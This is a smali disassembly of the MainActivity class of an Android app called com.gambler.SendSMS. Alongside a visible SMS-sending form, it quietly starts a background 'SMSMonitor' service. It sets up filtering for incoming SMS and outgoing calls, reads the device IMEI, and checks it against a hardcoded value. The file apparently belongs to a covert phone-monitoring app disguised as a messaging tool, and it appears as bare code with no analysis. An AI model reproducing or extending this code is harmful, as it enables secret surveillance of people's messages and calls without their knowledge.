.class public Lcom/gambler/SendSMS/MainActivity;
.super Landroid/app/Activity;

# interfaces
.implements Lcom/gambler/SendSMS/j;


# instance fields
.field a:Lcom/gambler/SendSMS/h;

.field private b:Landroid/widget/EditText;

.field private c:Landroid/widget/Button;

.field private d:Landroid/widget/TextView;

.field private e:Ljava/lang/String;

.field private f:Landroid/widget/EditText;

.field private g:Landroid/content/Context;

.field private h:Z

.field private i:Landroid/telephony/TelephonyManager;

.field private j:Z

.field private k:Ljava/lang/String;

.field private final l:Landroid/content/BroadcastReceiver;

.field private m:Landroid/view/View$OnClickListener;


# direct methods
.method public constructor <init>()V
    .locals 1

    const/4 v0, 0x0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    iput-boolean v0, p0, Lcom/gambler/SendSMS/MainActivity;->h:Z

    iput-boolean v0, p0, Lcom/gambler/SendSMS/MainActivity;->j:Z

    new-instance v0, Lcom/gambler/SendSMS/f;

    invoke-direct {v0, p0}, Lcom/gambler/SendSMS/f;-><init>(Lcom/gambler/SendSMS/MainActivity;)V

    iput-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->l:Landroid/content/BroadcastReceiver;

    new-instance v0, Lcom/gambler/SendSMS/g;

    invoke-direct {v0, p0}, Lcom/gambler/SendSMS/g;-><init>(Lcom/gambler/SendSMS/MainActivity;)V

    iput-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->m:Landroid/view/View$OnClickListener;

    return-void
.end method

.method static synthetic a(Lcom/gambler/SendSMS/MainActivity;)Landroid/widget/EditText;
    .locals 1

    iget-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->b:Landroid/widget/EditText;

    return-object v0
.end method

.method private a()V
    .locals 4

    const/4 v3, 0x0

    iget-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->b:Landroid/widget/EditText;

    invoke-virtual {v0, v3}, Landroid/widget/EditText;->setFocusable(Z)V

    new-instance v0, Landroid/app/AlertDialog$Builder;

    invoke-direct {v0, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    iget-object v1, p0, Lcom/gambler/SendSMS/MainActivity;->g:Landroid/content/Context;

    const v2, 0x7f05000a

    invoke-virtual {v1, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    iget-object v1, p0, Lcom/gambler/SendSMS/MainActivity;->g:Landroid/content/Context;

    const v2, 0x7f05000d

    invoke-virtual {v1, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    iget-object v1, p0, Lcom/gambler/SendSMS/MainActivity;->g:Landroid/content/Context;

    const v2, 0x7f05000b

    invoke-virtual {v1, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Lcom/gambler/SendSMS/i;

    invoke-direct {v2, p0}, Lcom/gambler/SendSMS/i;-><init>(Lcom/gambler/SendSMS/MainActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    invoke-virtual {v0, v3}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;

    return-void
.end method

.method static synthetic a(Lcom/gambler/SendSMS/MainActivity;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/gambler/SendSMS/MainActivity;->k:Ljava/lang/String;

    return-void
.end method

.method static synthetic a(Lcom/gambler/SendSMS/MainActivity;Ljava/lang/String;Ljava/lang/String;)V
    .locals 7

    const/4 v3, 0x0

    const/4 v2, 0x0

    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1}, Landroid/content/Intent;-><init>()V

    invoke-static {p0, v3, v1, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    invoke-virtual {p2}, Ljava/lang/String;->length()I

    move-result v1

    const/16 v3, 0x46

    if-le v1, v3, :cond_1

    invoke-virtual {v0, p2}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :goto_0
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-nez v1, :cond_0

    :goto_1
    const-string v0, "\u77ed\u4fe1\u53d1\u9001\u5b8c\u6210"

    const/4 v1, 0x1

    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    return-void

    :cond_0
    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-object v1, p1

    move-object v3, p2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    goto :goto_0

    :cond_1
    move-object v1, p1

    move-object v3, p2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    goto :goto_1
.end method

.method static synthetic a(Lcom/gambler/SendSMS/MainActivity;Z)V
    .locals 0

    iput-boolean p1, p0, Lcom/gambler/SendSMS/MainActivity;->j:Z

    return-void
.end method

.method static synthetic b(Lcom/gambler/SendSMS/MainActivity;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->k:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic c(Lcom/gambler/SendSMS/MainActivity;)Z
    .locals 1

    iget-boolean v0, p0, Lcom/gambler/SendSMS/MainActivity;->h:Z

    return v0
.end method

.method static synthetic d(Lcom/gambler/SendSMS/MainActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/gambler/SendSMS/MainActivity;->a()V

    return-void
.end method

.method static synthetic e(Lcom/gambler/SendSMS/MainActivity;)Landroid/widget/EditText;
    .locals 1

    iget-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->f:Landroid/widget/EditText;

    return-object v0
.end method

.method static synthetic f(Lcom/gambler/SendSMS/MainActivity;)Z
    .locals 1

    iget-boolean v0, p0, Lcom/gambler/SendSMS/MainActivity;->j:Z

    return v0
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 3

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lcom/gambler/SendSMS/MainActivity;->getBaseContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->g:Landroid/content/Context;

    const/high16 v0, 0x7f030000

    invoke-virtual {p0, v0}, Lcom/gambler/SendSMS/MainActivity;->setContentView(I)V

    const v0, 0x7f060003

    invoke-virtual {p0, v0}, Lcom/gambler/SendSMS/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    iput-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->b:Landroid/widget/EditText;

    const v0, 0x7f060006

    invoke-virtual {p0, v0}, Lcom/gambler/SendSMS/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    iput-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->f:Landroid/widget/EditText;

    const v0, 0x7f060007

    invoke-virtual {p0, v0}, Lcom/gambler/SendSMS/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->c:Landroid/widget/Button;

    const v0, 0x7f060009

    invoke-virtual {p0, v0}, Lcom/gambler/SendSMS/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->d:Landroid/widget/TextView;

    iget-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->d:Landroid/widget/TextView;

    iget-object v1, p0, Lcom/gambler/SendSMS/MainActivity;->g:Landroid/content/Context;

    const v2, 0x7f050008

    invoke-virtual {v1, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/text/Html;->fromHtml(Ljava/lang/String;)Landroid/text/Spanned;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->c:Landroid/widget/Button;

    iget-object v1, p0, Lcom/gambler/SendSMS/MainActivity;->m:Landroid/view/View$OnClickListener;

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    const-string v1, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v1, "android.intent.action.NEW_OUTGOING_CALL"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.RUN"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-class v1, Lcom/gambler/SendSMS/SMSMonitor;

    invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcom/gambler/SendSMS/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    iget-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->g:Landroid/content/Context;

    invoke-static {v0}, Lcom/gambler/SendSMS/d;->a(Landroid/content/Context;)V

    const-string v0, "phone"

    invoke-virtual {p0, v0}, Lcom/gambler/SendSMS/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    iput-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->i:Landroid/telephony/TelephonyManager;

    iget-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->i:Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->e:Ljava/lang/String;

    iget-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->i:Landroid/telephony/TelephonyManager;

    new-instance v1, Lcom/gambler/SendSMS/c;

    invoke-direct {v1, p0}, Lcom/gambler/SendSMS/c;-><init>(Lcom/gambler/SendSMS/MainActivity;)V

    const/16 v2, 0x20

    invoke-virtual {v0, v1, v2}, Landroid/telephony/TelephonyManager;->listen(Landroid/telephony/PhoneStateListener;I)V

    new-instance v0, Lcom/gambler/SendSMS/h;

    invoke-direct {v0}, Lcom/gambler/SendSMS/h;-><init>()V

    iput-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->a:Lcom/gambler/SendSMS/h;

    iget-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->a:Lcom/gambler/SendSMS/h;

    invoke-virtual {v0, p0}, Lcom/gambler/SendSMS/h;->a(Lcom/gambler/SendSMS/j;)V

    sget-boolean v0, Lcom/gambler/SendSMS/d;->a:Z

    if-nez v0, :cond_0

    iget-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->e:Ljava/lang/String;

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/gambler/SendSMS/MainActivity;->e:Ljava/lang/String;

    const-string v1, "357841030990929"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    :cond_0
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/gambler/SendSMS/MainActivity;->h:Z

    :goto_0
    return-void

    :cond_1
    invoke-direct {p0}, Lcom/gambler/SendSMS/MainActivity;->a()V

    goto :goto_0
.end method
